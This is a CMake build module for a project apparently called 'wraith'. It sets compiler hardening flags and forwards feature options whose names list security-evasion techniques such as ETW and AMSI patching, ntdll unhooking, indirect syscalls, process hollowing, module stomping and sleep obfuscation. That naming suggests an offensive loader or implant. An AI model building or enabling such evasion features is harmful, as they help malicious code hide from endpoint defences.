# cmake/modules/HardenFlags.cmake
#
# Compiler-driven hardening flags. Each option in cmake/options.cmake maps
# to compile flags applied to the wraith target via wr_apply_hardening.

function(wr_apply_hardening target)
  if(MSVC)
  if(WRAITH_HARDEN_STACK_PROTECT)
  target_compile_options(${target} PRIVATE /GS)
  endif()
  if(WRAITH_HARDEN_CFG)
  target_compile_options(${target} PRIVATE /guard:cf)
  target_link_options(${target}  PRIVATE /guard:cf)
  endif()
  if(WRAITH_HARDEN_CET)
  target_compile_options(${target} PRIVATE /CETCOMPAT)
  target_link_options(${target}  PRIVATE /CETCOMPAT)
  endif()
  target_compile_options(${target} PRIVATE /sdl /W4 /WX)
  else()
  # GCC / Clang / MinGW
  if(WRAITH_HARDEN_STACK_PROTECT)
  target_compile_options(${target} PRIVATE -fstack-protector-strong)
  endif()
  if(WRAITH_HARDEN_CFG)
  target_compile_options(${target} PRIVATE -fcf-protection=full)
  endif()
  if(WRAITH_HARDEN_NO_CRT)
  target_compile_options(${target} PRIVATE -nostdlib -ffreestanding)
  target_link_options(${target}  PRIVATE -nostdlib)
  endif()
  # -Wpedantic intentionally OFF: Win32 routinely converts between
  # void* and function pointers (GetProcAddress -> FARPROC, etc.).
  target_compile_options(${target} PRIVATE
  -Wall -Wextra -Wshadow
  -Wstrict-prototypes -Wmissing-prototypes
  -Werror=implicit-function-declaration
  -Werror=incompatible-pointer-types
  -fno-strict-aliasing
  )
  endif()
endfunction()

function(wr_apply_feature_defines target)
  # Forward every WRAITH_USE_* / WRAITH_*_ALGO option as a compile definition
  # so source files can #ifdef on them.
  foreach(_opt
  WRAITH_FORWARDED_EXPORTS WRAITH_DELAY_LOAD_IMPORTS WRAITH_BOUND_IMPORTS
  WRAITH_REGISTER_SEH_X64 WRAITH_TLS_FULL_LIFECYCLE WRAITH_RW_TO_RX_HYGIENE
  WRAITH_USE_API_HASHING WRAITH_USE_PEB_WALK WRAITH_USE_INDIRECT_SYSCALLS
  WRAITH_USE_PEB_LINKAGE WRAITH_USE_PHANTOM_HOLLOWING WRAITH_USE_MODULE_STOMPING
  WRAITH_USE_SLEEP_OBFUSCATION WRAITH_USE_UNHOOK_NTDLL
  WRAITH_USE_ETW_PATCH WRAITH_USE_AMSI_PATCH
  WRAITH_USE_STACK_SPOOF WRAITH_USE_HWBP_HOOKS WRAITH_USE_PRIVATE_NTDLL
  WRAITH_USE_THREADLESS_EXEC WRAITH_USE_PAGE_GUARD_ENCRYPT
  WRAITH_USE_HEAP_MASQUERADE WRAITH_USE_ANTI_DEBUG_SPOOF WRAITH_USE_HOST_IAT_REDIRECT
  WRAITH_DEBUG_LOG WRAITH_TRACE_PIPELINE
  )
  if(${_opt})
  target_compile_definitions(${target} PRIVATE ${_opt}=1)
  else()
  target_compile_definitions(${target} PRIVATE ${_opt}=0)
  endif()
  endforeach()

  target_compile_definitions(${target} PRIVATE
  WRAITH_HASH_ALGO_${WRAITH_HASH_ALGO}=1
  WRAITH_SLEEP_ALGO_${WRAITH_SLEEP_ALGO}=1
  WRAITH_SC_RESOLVER_${WRAITH_SC_RESOLVER}=1
  WRAITH_MAP_DEFAULT_${WRAITH_MAP_DEFAULT}=1
  WRAITH_HASH_ALGO_NAME="${WRAITH_HASH_ALGO}"
  WRAITH_SLEEP_ALGO_NAME="${WRAITH_SLEEP_ALGO}"
  WRAITH_SC_RESOLVER_NAME="${WRAITH_SC_RESOLVER}"
  WRAITH_PROFILE_NAME="${WRAITH_PROFILE}"
  WRAITH_VERSION_STRING="${WRAITH_VERSION}"
  )
endfunction()
